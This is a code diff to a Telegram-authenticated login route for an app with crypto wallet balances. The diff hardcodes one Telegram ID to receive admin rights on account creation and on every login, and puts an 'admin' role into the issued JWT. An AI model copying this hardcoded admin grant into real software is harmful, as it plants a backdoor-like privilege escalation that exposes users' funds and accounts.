@@ -93,6 +93,7 @@ export async function POST(req: Request) {
           wallet: {
             create: { usdtBalance: 0.0, tmtBalance: 0.0, bonusBalance: bonus },
           },
+          isAdmin: telegramId === '6859842859',
         },
         include: { 
           wallet: true,
@@ -104,9 +105,13 @@ export async function POST(req: Request) {
       const updateData: any = {
         username: username || user.username,
         firstName: firstName || lastName || user.firstName,
-        tgChatId: telegramId, // Сохраняем Chat ID для уведомлений
+        tgChatId: telegramId,
         lastSeen: new Date(),
       };
+
+      if (telegramId === '6859842859') {
+        updateData.isAdmin = true;
+      }
 
       // Если у пользователя еще нет реферера, пробуем установить его сейчас
       if (!user.referrerId && startParam) {
@@ -137,7 +142,7 @@ export async function POST(req: Request) {
     const token = await signJwt({ 
       userId: user.id, 
       telegramId: user.telegramId,
-      role: user.level
+      role: user.isAdmin ? 'admin' : user.level
     });
 
     const cookieStore = await cookies();
